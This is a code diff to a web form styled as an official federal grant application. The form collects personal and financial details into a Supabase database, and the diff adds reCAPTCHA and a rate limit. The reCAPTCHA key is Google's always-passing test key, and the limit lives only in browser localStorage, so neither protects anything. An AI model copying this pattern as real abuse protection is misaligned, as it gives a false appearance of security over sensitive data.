@@ -6,6 +6,7 @@
 <title>Apply | Federal Support Grant — GVN Official Program</title>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
@@ -612,6 +613,10 @@ body{font-family:'DM Sans',sans-serif;color:var(--dark);background:var(--off);ov
             </label>
           </div>
 
+          <!-- RATE LIMITING + RECAPTCHA -->
+          <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" style="margin-bottom:16px"></div>
+          <div id="rateLimitBox" style="display:none;background:#fef2f2;border:1px solid #fca5a5;border-radius:5px;padding:12px 16px;margin-bottom:14px;font-size:13px;color:#b91c1c;text-align:center"></div>
+
           <button type="submit" class="submit-btn" id="submitBtn">
             <span>📋</span><span id="btnText">Submit Official Application</span>
           </button>
@@ -770,10 +775,49 @@ amountInput.addEventListener('input', function(){
 })
 document.getElementById('category').addEventListener('change',function(){if(getRawAmount()>0)amountInput.dispatchEvent(new Event('input'))})
 
+// ── RATE LIMITING ──
+const SUB_KEY = 'fsg_submissions'
+const SUB_WINDOW = 24 * 60 * 60 * 1000 // 24 hours
+const MAX_SUBS = 3
+
+function checkRateLimit() {
+  const raw = localStorage.getItem(SUB_KEY)
+  if (!raw) return { allowed: true, remaining: MAX_SUBS }
+  const data = JSON.parse(raw)
+  const now = Date.now()
+  // Clear old entries outside 24hr window
+  const recent = data.filter(t => now - t < SUB_WINDOW)
+  localStorage.setItem(SUB_KEY, JSON.stringify(recent))
+  if (recent.length >= MAX_SUBS) {
+    const oldest = recent[0]
+    const resetIn = Math.ceil((SUB_WINDOW - (now - oldest)) / 3600000)
+    return { allowed: false, remaining: 0, resetIn }
+  }
+  return { allowed: true, remaining: MAX_SUBS - recent.length }
+}
+
+function recordSubmission() {
+  const raw = localStorage.getItem(SUB_KEY)
+  const data = raw ? JSON.parse(raw) : []
+  data.push(Date.now())
+  localStorage.setItem(SUB_KEY, JSON.stringify(data))
+}
+
 // ── SUBMIT ──
 function generateRef(){return 'FSG-'+Date.now().toString().slice(-8)}
 document.getElementById('grantForm').addEventListener('submit', async (e) => {
   e.preventDefault()
+
+  // ── Rate limit check ──
+  const rateCheck = checkRateLimit()
+  const rateLimitBox = document.getElementById('rateLimitBox')
+  if (!rateCheck.allowed) {
+    rateLimitBox.style.display = 'block'
+    rateLimitBox.textContent = '⚠ Maximum 3 submissions per 24 hours reached. Please try again in ' + rateCheck.resetIn + ' hour(s).'
+    window.scrollTo({top: rateLimitBox.offsetTop - 100, behavior: 'smooth'})
+    return
+  }
+
   const errorBox = document.getElementById('errorBox')
   errorBox.style.display = 'none'
   const required = ['firstName','lastName','dob','email','phone','address','state','applicantType','category','amount','income','purpose','numCreditCards','creditCardDebt','totalDebt','monthlyDebt','bankruptcy','housingStatus','latePayments']
@@ -826,6 +870,7 @@ document.getElementById('grantForm').addEventListener('submit', async (e) => {
     const {error} = await db.from('applications').insert([payload])
     if(error) throw new Error(error.message)
     document.getElementById('successRef').textContent = ref
+    recordSubmission() // Track this submission for rate limiting
     document.getElementById('formCard').style.display = 'none'
     document.getElementById('successCard').style.display = 'block'
     window.scrollTo({top:0,behavior:'smooth'})
